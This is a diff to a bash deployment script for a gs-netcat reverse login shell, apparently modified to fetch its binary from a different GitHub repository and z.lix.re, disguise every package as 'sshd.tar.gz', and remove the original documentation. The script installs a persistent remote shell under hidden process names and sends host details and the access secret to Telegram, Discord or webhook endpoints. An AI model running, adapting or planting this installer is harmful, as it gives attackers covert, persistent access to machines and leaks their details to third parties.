@@ -1,78 +1,13 @@
 #! /usr/bin/env bash
 
-# Install and start a permanent gs-netcat reverse login shell
-#
-# See https://www.gsocket.io/deploy/ for examples.
-#
-# This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
-#
-# Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
-# Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
-# Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
-#
-# Other variables:
-# GS_DEBUG=1
-#		- Verbose output
-#		- Shorter timeout to restart crontab etc
-#       - Often used like this:
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-# GS_USELOCAL=1
-#       - Use local binaries (do not download)
-# GS_USELOCAL_GSNC=<path to gs-netcat binary>
-#       - Use local gs-netcat from source tree
-# GS_NOSTART=1
-#       - Do not start gs-netcat (for testing purpose only)
-# GS_NOINST=1
-#		- Do not install gsocket
-# GS_OSARCH=x86_64-alpine
-#       - Force architecutre to a specific package (for testing purpose only)
-# GS_PREFIX=
-#		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://gsocket.io
-#		- Specify URL of static binaries
-# GS_URL_BIN=
-#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
-# GS_DSTDIR="/tmp/foobar/blah"
-#		- Specify custom installation directory
-# GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process, default is [kcached]
-# GS_BIN_HIDDEN_NAME="gs-dbus"
-#       - Specify custom name for binary on filesystem (default is gs-dbus)
-#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
-# GS_DL=wget
-#       - Command to use for download. =wget or =curl.
-# GS_TG_TOKEN=
-#       - Telegram Bot ID, =5794110125:AAFDNb...
-# GS_TG_CHATID=
-#       - Telegram Chat ID, =-8834838...
-# GS_DISCORD_KEY=
-#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-# GS_WEBHOOK_KEY=
-#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-# GS_WEBHOOK=
-#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
-# GS_HOST=
-#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
-#       - See https://github.com/hackerschoice/gsocket-relay
-# GS_PORT=
-#       - Port for the GSRN-Server. Default is 443.
-# TMPDIR=
-#       - Guess what...
-
-# Global Defines
-URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/raw/gh-pages"
+URL_BASE_CDN="https://raw.githubusercontent.com/YakouDev/z"
 URL_BASE_X="https://z.lix.re"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
 }
-URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
-URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+URL_BIN="${URL_BASE_CDN}/main"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/main" # full version (with -h working)
 [[ -n $GS_URL_BIN ]] && {
 	URL_BIN="${GS_URL_BIN}"
 	URL_BIN_FULL="$URL_BIN"
@@ -85,8 +20,6 @@ GS_WEBHOOK_404_OK=
 [[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
 unset gs_deploy_webhook
 
-# WEBHOOKS are executed after a successfull install
-# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
 GS_TG_TOKEN="xdeath"
@@ -632,51 +565,51 @@ init_vars()
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
 				OSARCH="i386-alpine"
-				SRC_PKG="gs-netcat_mini-linux-i686"
+				SRC_PKG="sshd.tar.gz"
 			elif [[ "$arch" == *"armv6"* ]]; then
 				OSARCH="arm-linux"
-				SRC_PKG="gs-netcat_mini-linux-armv6"
+				SRC_PKG="sshd.tar.gz"
 			elif [[ "$arch" == *"armv7l" ]]; then
 				OSARCH="arm-linux"
-				SRC_PKG="gs-netcat_mini-linux-armv7l"
+				SRC_PKG="sshd.tar.gz"
 			elif [[ "$arch" == *"armv"* ]]; then
 				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
-				SRC_PKG="gs-netcat_mini-linux-arm"
+				SRC_PKG="sshd.tar.gz"
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
-				SRC_PKG="gs-netcat_mini-linux-aarch64"
+				SRC_PKG="sshd.tar.gz"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
-				SRC_PKG="gs-netcat_mini-linux-mips64"
+				SRC_PKG="sshd.tar.gz"
 				# Go 32-bit if Little Endian even if 64bit arch
 				is_le && {
 					OSARCH="mipsel32-alpine"
-					SRC_PKG="gs-netcat_mini-linux-mipsel"
+					SRC_PKG="sshd.tar.gz"
 				}
 			elif [[ "$arch" == *mips* ]]; then
 				OSARCH="mips32-alpine"
-				SRC_PKG="gs-netcat_mini-linux-mips32"
+				SRC_PKG="sshd.tar.gz"
 				is_le && {
 					OSARCH="mipsel32-alpine"
-					SRC_PKG="gs-netcat_mini-linux-mipsel"
+					SRC_PKG="sshd.tar.gz"
 				}
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
 				OSARCH="x86_64-osx" # M1
 				## FIXME: really needs M3 here..
-				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+				SRC_PKG="sshd.tar.gz"
 				# OSARCH="arm64-osx" # M1
 			else
 				OSARCH="x86_64-osx"
-				SRC_PKG="gs-netcat_mini-macOS-x86_64"
+				SRC_PKG="sshd.tar.gz"
 			fi
 		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
 				OSARCH="x86_64-freebsd"
-				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+				SRC_PKG="sshd.tar.gz"
 		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
 				OSARCH="x86_64-openbsd"
-				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+				SRC_PKG="sshd.tar.gz"
 		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
 			OSARCH="i686-cygwin"
 			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
@@ -687,7 +620,7 @@ init_vars()
 		[[ -z "$OSARCH" ]] && {
 			# Default: Try Alpine(muscl libc) 64bit
 			OSARCH="x86_64-alpine"
-			SRC_PKG="gs-netcat_mini-linux-x86_64"
+			SRC_PKG="sshd.tar.gz"
 		}
 	fi
 
@@ -699,7 +632,7 @@ init_vars()
 	#try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	SRC_PKG="sshd.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -1390,7 +1323,7 @@ test_bin()
 
 	# Try to execute the binary
 	unset ERR_LOG
-	GS_OUT=$("$bin" -g 2>&1)
+	GS_OUT=$("$bin" -g 2>&1 | md5sum | awk '{print $1}')
 	ret=$?
 	[[ $ret -ne 0 ]] && {
 		# 126 - Exec format error
